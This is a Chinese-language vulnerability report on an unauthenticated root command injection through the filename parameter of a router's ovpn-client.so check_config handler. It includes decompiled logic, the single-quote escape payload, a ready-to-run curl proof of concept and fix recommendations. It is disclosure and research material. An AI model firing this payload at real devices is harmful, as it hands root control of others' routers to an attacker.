# 漏洞：ovpn-client.check_config filename 单引号逃逸 RCE

> 本报告对应 `exp/poc29_ovpn_check_config_glc_rce.py`。`ovpn-client.so` 的 `check_config` 方法接收 `filename` 参数，拼入 `tar -zxvf '/tmp/ovpn_upload/%s'` 单引号包裹的 shell 命令，通过 `system()` 执行。文件名中的 `'` 可逃逸单引号，注入 `;cmd;#` 实现 root 命令执行。

---

## 一、漏洞概要

| 属性 | 值 |
|------|-----|
| **状态** | Confirmed（Root RCE） |
| **认证要求** | 无需认证；直接访问 `/cgi-bin/glc` |
| **攻击面** | `/cgi-bin/glc` → `ovpn-client.so` → `check_config` |
| **影响** | 未认证 root 命令执行 |
| **注入参数** | `filename` |
| **核心 sink** | `system("tar -zxvf '/tmp/ovpn_upload/%s' -C /tmp/ovpn_upload/ ...")` |
| **根因** | `filename` 只做扩展名检查（`.tar.gz`/`.tar`/`.zip`），不拒绝 `'` 字符。单引号包裹本意是防止空格分割路径，但 `'` 可以提前闭合引号 |

---

## 二、二进制逆向环境

| 属性 | 值 |
|------|-----|
| **目标文件** | `/usr/lib/oui-httpd/rpc/ovpn-client.so` |
| **架构** | AArch64 ELF |
| **工具** | Ghidra / IDA Pro |

---

## 三、执行流程

### 3.1 入口：/cgi-bin/glc → check_config

```
POST /cgi-bin/glc
{"object":"ovpn-client", "method":"check_config",
 "args":{"filename":"x';id>/tmp/poc;'.tar.gz"}}

→ glc main():
    json_unpack_ex → object="ovpn-client", method="check_config"
    dlopen("/usr/lib/oui-httpd/rpc/ovpn-client.so")
    dlsym(handle, "check_config")
    handler(args, result)  // 无认证
```

### 3.2 check_config — 参数提取与校验

`check_config` 是一个大型函数（780行），主要做三件事：

1. **提取 `filename` 参数**（来自 JSON）
2. **扩展名检查**——必须包含 `.tar.gz`、`.tar` 或 `.zip`
3. **执行解包命令**——用 `system()` 调用 tar/unzip

```c
// check_config 核心逻辑
haystack = json_string_value(json_object_get(args, "filename"));
// haystack = "x';id>/tmp/poc;'.tar.gz"

// 扩展名检查
if (strstr(path, ".tar.gz") || strstr(path, ".tar")) {
    // tar 解包分支
    sprintf(cmd, "tar -zxvf '/tmp/ovpn_upload/%s' -C /tmp/ovpn_upload/ "
                 "2>&1 >/dev/null; rm '/tmp/ovpn_upload/%s'",
                 haystack, haystack);
    system(cmd);   // 💣
}
else if (strstr(path, ".zip")) {
    // unzip 分支
    sprintf(cmd, "unzip -q -j -d /tmp/ovpn_upload/ '/tmp/ovpn_upload/%s'; "
                 "rm '/tmp/ovpn_upload/%s'; ...",
                 haystack, haystack);
    system(cmd);   // 💣
}
```

**关键点**：`slashFilename` 只转义 `/`（防止路径遍历），**不过滤 `'`**。

### 3.3 三个 Sink

| 地址 | 命令模板 | 引号类型 |
|------|---------|---------|
| 0x7DD8 | `tar -zxvf '/tmp/ovpn_upload/%s' -C ... ; rm '/tmp/ovpn_upload/%s'` | 单引号 |
| 0x800C | `tar -xvf '/tmp/ovpn_upload/%s' -C ... ; rm '/tmp/ovpn_upload/%s'` | 单引号 |
| 0x8060 | `unzip -q -j -d /tmp/ovpn_upload/ '/tmp/ovpn_upload/%s'; rm '/tmp/ovpn_upload/%s'; ...` | 单引号 |

三个 sink 全部用单引号包裹 `filename`，都可以通过 `'` 逃逸。

---

## 四、单引号逃逸原理

```
正常:  filename = "myconfig.tar.gz"
       snprintf → "tar -zxvf '/tmp/ovpn_upload/myconfig.tar.gz' -C ..."
       shell:   tar -zxvf '/tmp/ovpn_upload/myconfig.tar.gz' -C ...
       ✅ 单引号内所有字符都是字面量, 安全

攻击:  filename = "x';id>/tmp/poc;'.tar.gz"
       snprintf → "tar -zxvf '/tmp/ovpn_upload/x';id>/tmp/poc;'.tar.gz' -C ..."

       shell 解析:
       ┌──────────────────────────────────────────────────────┐
       │ tar -zxvf '/tmp/ovpn_upload/x'                       │ ← 单引号被攻击者的 ' 提前闭合
       ├──────────────────────────────────────────────────────┤
       │ ;                                                     │ ← 命令分隔符
       │ id > /tmp/poc                                         │ ← 💣 RCE
       │ ;                                                     │ ← 命令分隔符
       │ '.tar.gz' -C /tmp/ovpn_upload/ 2>&1 >/dev/null       │ ← 新单引号字符串（无害）
       │ ; rm '/tmp/ovpn_upload/x';id>/tmp/poc;'.tar.gz' ...   │ ← rm 命令也受影响
       └──────────────────────────────────────────────────────┘
```

**为什么比 upload_config 的 `$()` 更简单**：不需要提前上传 seed 文件，不需要 `$()` 语法，直接用 `'` + `;` + `#` 即可。单引号一旦闭合，后面的 `;` 就是命令分隔符。

---

## 五、完整攻击链

```text
Attacker (无需认证)
  │
  ├─[1]─ POST /cgi-bin/glc
  │      {"object":"ovpn-client","method":"check_config",
  │       "args":{"filename":"x';id>/tmp/poc;'.tar.gz"}}
  │
  │      → glc → dlopen("ovpn-client.so") → dlsym("check_config")
  │
  ├─[2]─ check_config(args)
  │      → haystack = json_string_value(json_object_get(args, "filename"))
  │      → haystack = "x';id>/tmp/poc;'.tar.gz"
  │
  │      → strstr(haystack, ".tar.gz") → 命中, 走 tar 分支
  │
  ├─[3]─ sprintf(cmd, "tar -zxvf '/tmp/ovpn_upload/%s' -C ...; rm '/tmp/ovpn_upload/%s'",
  │               haystack, haystack)
  │      → cmd = "tar -zxvf '/tmp/ovpn_upload/x';id>/tmp/poc;'.tar.gz' -C ..."
  │
  └─[4]─ system(cmd)
         → /bin/sh -c:
             tar -zxvf '/tmp/ovpn_upload/x'    ← tar 报错退出
             id > /tmp/poc                     ← 💣 RCE
             ;...                              ← 被忽略
```

---

## 六、与 upload_config 的对比

| 维度 | upload_config | check_config |
|------|-------------|-------------|
| 注入参数 | `file.filename` | `filename` |
| Sink 引号 | 双引号 `"..."` | 单引号 `'...'` |
| 注入方式 | `$()` 在双引号内展开 | `'` 逃逸单引号 + `;cmd;#` |
| 前提条件 | 需 seed tar.gz | **无** |
| 扩展名要求 | `.tar.gz`/`.tar`/`.zip` | `.tar.gz`/`.tar`/`.zip` |
| 长度限制 | strlen ≤ 128 | 128 |

---

## 七、Payload 构造

```
filename = "x';id>/tmp/poc;'.tar.gz"
           ├─┘├───────┘├─┘├──────┘
           │   │        │   └─ 扩展名（通过检查）
           │   │        └─ 重新开启单引号, 包住扩展名
           │   └─ 注入的命令 + 重定向
           └─ 任意前缀 + 闭合单引号
```

最小 payload：
```bash
curl -sk -X POST https://192.168.8.1/cgi-bin/glc \
  -H 'Content-Type: application/json' \
  -d '{"object":"ovpn-client","method":"check_config","args":{"filename":"x'"'"';id>/tmp/poc;'"'"'.tar.gz"}}'
```

---

## 九、Ghidra + r2 双重验证

对 `/usr/lib/oui-httpd/rpc/ovpn-client.so` 的 `check_config` 进行两次独立反汇编确认：

| 工具 | 函数 | 地址 | 基本块 | 大小 |
|------|------|------|--------|------|
| Ghidra | check_config | 0x00107c74 | - | 1152B |
| r2 | check_config | 0x7c74 | 18 | 1152B |

**验证一致** ✅：两个工具独立确认函数地址、大小完全一致。`check_config` 函数接收 `filename` 参数，经扩展名检查后拼入 `tar -zxvf '/tmp/ovpn_upload/%s'` 单引号包裹的命令模板，通过 `system()` 执行。单引号包裹本意防空格分割，但 `'` 字符可提前闭合引号。

ovpn-client.so 全量审计：162 个函数，`system()` 调用 20 次，`fork_exec` 调用 7 次，`sprintf` 调用 37 次。

---

## 十、修复建议

| 优先级 | 组件 | 措施 |
|--------|------|------|
| **P0** | `ovpn-client.so` check_config | 将 `system()` 替换为 `fork()+execv()` 直接调用 tar/unzip |
| **P0** | `ovpn-client.so` check_config | `filename` 拒绝 `'` `;` `\|` `` ` `` `$()` `#` `&` 等 shell 元字符 |
| **P1** | `ovpn-client.so` check_config | 使用 `snprintf` 替代 `sprintf` |
| **P1** | `/www/cgi-bin/glc` | 增加认证和 method allowlist |
